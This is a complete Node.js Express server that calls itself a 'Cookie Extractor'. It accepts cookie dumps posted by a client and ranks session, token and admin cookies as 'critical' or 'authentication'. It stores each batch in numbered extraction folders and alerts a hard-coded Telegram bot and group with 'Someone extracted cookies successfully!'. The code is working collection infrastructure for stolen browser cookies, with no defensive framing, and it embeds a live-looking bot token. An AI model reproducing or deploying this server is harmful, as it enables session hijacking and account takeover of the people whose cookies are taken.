const express = require('express');
const fs = require('fs').promises;
const path = require('path');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = 3000;

const TELEGRAM_BOT_TOKEN = '8314191667:AAHe2jsttEW_jQa55H1urHkAXWQwIs-_j6k';
const TELEGRAM_GROUP_CHAT_ID = '-4934774623';

app.use(cors());
app.use(express.json({ limit: '40mb' }));

const DOWNLOADS_DIR = path.join(__dirname, 'downloads');

async function ensureDownloadsDir() {
    try {
        await fs.access(DOWNLOADS_DIR);
    } catch (error) {
        await fs.mkdir(DOWNLOADS_DIR, { recursive: true });
    }
}

class TelegramNotifier {
    constructor(botToken, chatId) {
        this.botToken = botToken;
        this.chatId = chatId;
        this.apiUrl = `https://api.telegram.org/bot${botToken}`;
    }

    async sendMessage(text) {
        const response = await axios.post(`${this.apiUrl}/sendMessage`, {
            chat_id: this.chatId,
            text: text,
            disable_web_page_preview: true
        });
        return response.data;
    }

    async sendDocument(filePath, caption = '') {
        const FormData = require('form-data');
        const form = new FormData();
        
        const fileStream = require('fs').createReadStream(filePath);
        form.append('chat_id', this.chatId);
        form.append('document', fileStream);
        if (caption) {
            form.append('caption', caption);
        }

        const response = await axios.post(`${this.apiUrl}/sendDocument`, form, {
            headers: form.getHeaders(),
            timeout: 30000
        });
        return response.data;
    }
}

const telegramNotifier = new TelegramNotifier(TELEGRAM_BOT_TOKEN, TELEGRAM_GROUP_CHAT_ID);

async function getNextExtractionNumber(baseDir) {
    try {
        const items = await fs.readdir(baseDir);
        const extractionFolders = items.filter(item => item.startsWith('extraction_'));
        const numbers = extractionFolders.map(folder => {
            const match = folder.match(/extraction_(\d+)/);
            return match ? parseInt(match[1]) : 0;
        });
        return numbers.length > 0 ? Math.max(...numbers) + 1 : 1;
    } catch (error) {
        return 1;
    }
}

class CookieClassifier {
    constructor() {
        this.authCookiePatterns = [
            /session/i, /auth/i, /login/i, /token/i, /jwt/i, /bearer/i,
            /csrf/i, /xsrf/i, /sid/i, /sess/i, /user/i, /account/i
        ];

        this.criticalCookiePatterns = [
            /admin/i, /root/i, /super/i, /privilege/i, /role/i,
            /access_token/i, /refresh_token/i, /api_key/i, /secret/i
        ];

        this.trackingCookiePatterns = [
            /analytics/i, /tracking/i, /visitor/i, /utm/i, /campaign/i
        ];

        this.adCookiePatterns = [
            /ad/i, /advertisement/i, /marketing/i, /targeting/i
        ];

        this.functionalCookiePatterns = [
            /preference/i, /setting/i, /theme/i, /language/i, /locale/i
        ];
    }

    classifyCookie(cookie) {
        const name = cookie.name.toLowerCase();
        const value = cookie.value.toLowerCase();
        
        if (this.isCriticalCookie(name, value)) {
            return 'critical';
        }
        if (this.isAuthenticationCookie(name, value)) {
            return 'authentication';
        }
        if (this.isTrackingCookie(name, value)) {
            return 'tracking';
        }
        if (this.isAdvertisingCookie(name, value)) {
            return 'advertising';
        }
        if (this.isFunctionalCookie(name, value)) {
            return 'functional';
        }
        return 'unknown';
    }

    isCriticalCookie(name, value) {
        return this.criticalCookiePatterns.some(pattern => 
            pattern.test(name) || pattern.test(value)
        );
    }

    isAuthenticationCookie(name, value) {
        return this.authCookiePatterns.some(pattern => 
            pattern.test(name) || pattern.test(value)
        );
    }

    isTrackingCookie(name, value) {
        return this.trackingCookiePatterns.some(pattern => 
            pattern.test(name) || pattern.test(value)
        );
    }

    isAdvertisingCookie(name, value) {
        return this.adCookiePatterns.some(pattern => 
            pattern.test(name) || pattern.test(value)
        );
    }

    isFunctionalCookie(name, value) {
        return this.functionalCookiePatterns.some(pattern => 
            pattern.test(name) || pattern.test(value)
        );
    }
}

app.post('/api/cookies', async (req, res) => {
    try {
        const { filename, metadata, cookies } = req.body;
        
        if (!filename || !cookies) {
            return res.status(400).json({
                success: false,
                error: 'Missing required fields'
            });
        }
        
        const cookieData = {
            filename,
            metadata: {
                ...metadata,
                savedAt: new Date().toISOString()
            },
            cookies
        };
        
        console.log(`Processing ${cookies.length} cookies...`);
        
        // Step 1: Send Telegram notification (simple message only)
        let telegramSuccess = false;
        try {
            const notificationText = `Cookie Extraction Alert\n\nTime: ${new Date().toLocaleString()}\nTotal Cookies: ${cookies.length}\n\nSomeone extracted cookies successfully!`;
            await telegramNotifier.sendMessage(notificationText);
            telegramSuccess = true;
            console.log('Telegram notification sent successfully');
        } catch (telegramError) {
            console.log(`Telegram notification failed: ${telegramError.message}`);
            if (telegramError.response) {
                console.log(`Telegram API Error: ${JSON.stringify(telegramError.response.data)}`);
            }
        }
        
        // Step 2: Always save to local downloads folder with classification
        const classifier = new CookieClassifier();
        const nextExtractionNumber = await getNextExtractionNumber(DOWNLOADS_DIR);
        const folderName = `extraction_${nextExtractionNumber}`;
        const folderPath = path.join(DOWNLOADS_DIR, folderName);
        await fs.mkdir(folderPath, { recursive: true });
        
        // Classify and organize cookies
        const categorizedCookies = {
            critical: [],
            authentication: [],
            tracking: [],
            advertising: [],
            functional: [],
            unknown: []
        };
        
        cookies.forEach(cookie => {
            const category = classifier.classifyCookie(cookie);
            categorizedCookies[category].push(cookie);
        });
        
        // Save main cookies file
        await fs.writeFile(
            path.join(folderPath, 'cookies.json'),
            JSON.stringify(cookieData, null, 2)
        );
        
        // Save categorized files
        for (const [category, categoryCookies] of Object.entries(categorizedCookies)) {
            if (categoryCookies.length > 0) {
                await fs.writeFile(
                    path.join(folderPath, `${category}.json`),
                    JSON.stringify({
                        category: category,
                        count: categoryCookies.length,
                        cookies: categoryCookies,
                        extractedAt: new Date().toISOString()
                    }, null, 2)
                );
            }
        }
        
        const message = `Cookies saved to ${folderName}${telegramSuccess ? ' (Telegram notified)' : ' (Telegram failed)'}`;
        console.log(`Saved to local folder: ${folderName}`);

        return res.json({
            success: true,
            message: message,
            data: {
                telegramSuccess: telegramSuccess,
                folderName: folderName,
                totalCookies: cookies.length,
                categorizedCounts: Object.fromEntries(
                    Object.entries(categorizedCookies).map(([cat, cookies]) => [cat, cookies.length])
                ),
                savedAt: cookieData.metadata.savedAt
            }
        });
        
    } catch (error) {
        console.error('Error:', error);
        return res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

app.post('/api/test-telegram', async (req, res) => {
    try {
        const testMessage = `Test Notification\n\nServer is running and Telegram integration is working!\n\nTime: ${new Date().toLocaleString()}`;
        
        await telegramNotifier.sendMessage(testMessage);
        
        res.json({
            success: true,
            message: 'Test notification sent successfully to Telegram'
        });
        
    } catch (error) {
        res.status(500).json({
            success: false,
            error: `Failed to send test notification: ${error.message}`
        });
    }
});

app.get('/api/status', (req, res) => {
    res.json({
        success: true,
        status: 'running',
        timestamp: new Date().toISOString()
    });
});

async function startServer() {
    await ensureDownloadsDir();
    
    app.listen(PORT, () => {
        console.log('Cookie Extractor Server started');
        console.log(`Server running on http://localhost:${PORT}`);
        console.log('Telegram notifications: ENABLED');
        console.log('Ready to receive cookies!');
    });
}

startServer();
